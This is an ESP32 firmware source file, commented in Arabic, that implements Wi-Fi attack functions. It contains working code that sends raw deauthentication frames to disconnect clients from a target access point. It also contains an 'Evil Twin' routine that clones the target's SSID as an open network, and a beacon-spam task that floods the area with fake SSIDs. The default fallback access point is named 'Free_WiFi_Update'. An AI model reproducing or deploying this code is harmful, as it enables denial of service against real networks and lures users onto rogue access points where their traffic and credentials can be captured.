#include "attacks.h"
#include <WiFi.h>
#include <esp_wifi.h>

static bool beacon_spam_active = false;
static TaskHandle_t beacon_task_handle = NULL;
static String spam_base_name;
static int spam_count = 0;

// دالة إرسال حزم Deauth (قطع الاتصال)
void startDeauth(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    for(int i=0; i<20; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
        delay(5);
    }
}

// دالة بدء Evil Twin
void startEvilTwin(String ssid, uint8_t* bssid, uint8_t channel) {
    stopAllAttacks(); // إغلاق أي هجوم سابق أولاً
    
    startDeauth(bssid, channel);
    
    WiFi.softAPdisconnect(true);
    delay(200); // انتظار إغلاق الشبكة
    
    WiFi.softAP(ssid.c_str(), "", channel);
    Serial.println("Evil Twin started on: " + ssid);
}

// دالة المهمة الخلفية لبث الشبكات الوهمية (Beacon Spam)
void beaconTask(void * parameter) {
    uint8_t beacon_packet[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x31, 0x04,
        0x00, 0x00
    };

    int counter = 1;
    while(beacon_spam_active) {
        String current_ssid = spam_base_name + String(counter);
        int ssid_len = current_ssid.length();
        if (ssid_len > 32) ssid_len = 32;

        beacon_packet[37] = ssid_len;
        memcpy(&beacon_packet[38], current_ssid.c_str(), ssid_len);

        esp_wifi_80211_tx(WIFI_IF_AP, beacon_packet, 38 + ssid_len, false);
        
        counter++;
        if (counter > spam_count) counter = 1;
        delay(10);
    }
    vTaskDelete(NULL);
}

// دالة تشغيل بث الشبكات
void startBeaconSpam(String baseName, int count) {
    stopAllAttacks();
    spam_base_name = baseName;
    spam_count = count;
    beacon_spam_active = true;
    xTaskCreatePinnedToCore(beaconTask, "BeaconSpam", 4096, NULL, 1, &beacon_task_handle, 1);
    Serial.println("Beacon Spam started: " + baseName + " x" + String(count));
}

void initAttacks() {
    // لا شيء هنا حالياً
}

// دالة إيقاف جميع الهجمات وإعادة التشغيل الآمن
void stopAllAttacks() {
    if (beacon_spam_active) {
        beacon_spam_active = false;
        if (beacon_task_handle != NULL) {
            vTaskDelay(100); // انتظار توقف المهمة
            beacon_task_handle = NULL;
        }
    }
    
    // إغلاق كامل للاتصالات لمنع الانهيار
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    delay(200);
    
    // العودة للوضع الطبيعي (AP أساسي)
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free_WiFi_Update", "");
}

